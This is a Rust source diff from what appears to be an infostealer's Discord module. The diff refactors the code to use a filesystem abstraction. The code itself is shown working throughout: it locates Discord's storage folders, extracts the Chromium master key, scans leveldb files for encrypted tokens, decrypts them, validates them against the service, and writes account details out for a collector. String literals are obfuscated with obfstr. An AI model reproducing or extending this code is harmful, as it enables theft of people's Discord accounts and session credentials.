@@ -3,22 +3,23 @@ use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
+use browsers::chromium::{decrypt_protected_data, extract_master_key};
 use collector::{Collector, Software};
 use core::fmt::{Display, Formatter};
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::{FileSystem, WriteTo};
 use obfstr::obfstr as s;
 use requests::{Request, RequestBuilder, ResponseBodyExt};
-use tasks::{CompositeTask, Task, impl_composite_task_runner, parent_name};
+use tasks::{impl_composite_task_runner, parent_name, CompositeTask, Task};
 use utils::base64::base64_decode;
-use utils::browsers::chromium;
-use utils::browsers::chromium::extract_master_key;
-use utils::path::{Path, WriteToFile};
 
 struct TokenValidationTask {
     token: String,
 }
 
-impl<C: Collector> Task<C> for TokenValidationTask {
-    fn run(&self, parent: &Path, collector: &C) {
+impl<C: Collector, F: FileSystem> Task<C, F> for TokenValidationTask {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let Some(info) = get_token_info(self.token.clone()) else {
             return;
         };
@@ -27,20 +28,20 @@ impl<C: Collector> Task<C> for TokenValidationTask {
 
         let _ = info
             .to_string()
-            .write_to(parent / format!("{}.txt", info.username));
+            .write_to(filesystem, parent / format!("{}.txt", info.username));
     }
 }
 
-struct TokenWriterTask<C: Collector> {
-    inner: CompositeTask<C>,
+struct TokenWriterTask<C: Collector, F: FileSystem> {
+    inner: CompositeTask<C, F>,
 }
 
-impl<C: Collector> TokenWriterTask<C> {
+impl<C: Collector, F: FileSystem> TokenWriterTask<C, F> {
     fn new(tokens: Vec<String>) -> Self {
-        let tokens: Vec<Arc<dyn Task<C>>> = tokens
+        let tokens: Vec<Arc<dyn Task<C, F>>> = tokens
             .into_iter()
             .map(|token| TokenValidationTask { token })
-            .map(|task| Arc::new(task) as Arc<dyn Task<C>>)
+            .map(|task| Arc::new(task) as Arc<dyn Task<C, F>>)
             .collect();
 
         Self {
@@ -49,15 +50,15 @@ impl<C: Collector> TokenWriterTask<C> {
     }
 }
 
-impl_composite_task_runner!(TokenWriterTask<C>);
+impl_composite_task_runner!(TokenWriterTask<C, F>);
 
 pub(super) struct DiscordTask;
 
-impl<C: Collector> Task<C> for DiscordTask {
+impl<C: Collector, F: FileSystem> Task<C, F> for DiscordTask {
     parent_name!("Discord");
 
-    fn run(&self, parent: &Path, collector: &C) {
-        let mut tokens = collect_tokens(&get_discord_paths());
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
+        let mut tokens = collect_tokens(&StorageFileSystem, &get_discord_paths());
         tokens.sort();
         tokens.dedup();
 
@@ -65,7 +66,7 @@ impl<C: Collector> Task<C> for DiscordTask {
             return;
         }
 
-        TokenWriterTask::new(tokens).run(parent, collector);
+        TokenWriterTask::new(tokens).run(parent, filesystem, collector);
     }
 }
 
@@ -80,22 +81,25 @@ fn get_discord_paths() -> [Path; 4] {
     ]
 }
 
-fn collect_tokens(paths: &[Path]) -> Vec<String> {
+fn collect_tokens<F>(filesystem: &F, paths: &[Path]) -> Vec<String>
+where
+    F: FileSystem,
+{
     let mut result = Vec::new();
 
     for path in paths {
-        if !path.is_exists() {
+        if !filesystem.is_exists(&path) {
             continue;
         }
 
         if let Some(master_key) = unsafe { extract_master_key(path) } {
             let scan_path = path / s!("Local Storage") / s!("leveldb");
 
-            if !(scan_path.is_exists() && scan_path.is_dir()) {
+            if !(filesystem.is_dir(&scan_path)) {
                 continue;
             }
 
-            if let Some(tokens) = scan_tokens(&scan_path, &master_key) {
+            if let Some(tokens) = scan_tokens(filesystem, &scan_path, &master_key) {
                 result.extend(tokens);
             }
         }
@@ -104,17 +108,20 @@ fn collect_tokens(paths: &[Path]) -> Vec<String> {
     result
 }
 
-fn scan_tokens(scan_path: &Path, master_key: &[u8]) -> Option<Vec<String>> {
+fn scan_tokens<F>(filesystem: &F, scan_path: &Path, master_key: &[u8]) -> Option<Vec<String>>
+where
+    F: FileSystem,
+{
     let mut result = Vec::new();
 
-    let scannable = scan_path.list_files_filtered(&|file| {
+    let scannable = filesystem.list_files_filtered(scan_path, &|file| {
         file.extension()
             .map(|ext| ext == s!("ldb") || ext == s!("log"))
             .unwrap_or(false)
     })?;
 
     for entry in scannable {
-        let content = entry.read_file().unwrap();
+        let content = filesystem.read_file(&entry).ok()?;
         let encrypted_tokens = extract_encrypted_token_strings(&content);
 
         for encrypted_token in encrypted_tokens {
@@ -130,7 +137,7 @@ fn scan_tokens(scan_path: &Path, master_key: &[u8]) -> Option<Vec<String>> {
 #[inline(always)]
 fn decrypt_token(token_slice: &[u8], master_key: &[u8]) -> Option<String> {
     let decoded = base64_decode(token_slice)?;
-    let decrypted = unsafe { chromium::decrypt_data(&decoded, Some(master_key), None) }?;
+    let decrypted = unsafe { decrypt_protected_data(&decoded, Some(master_key), None) }?;
     Some(decrypted)
 }
 
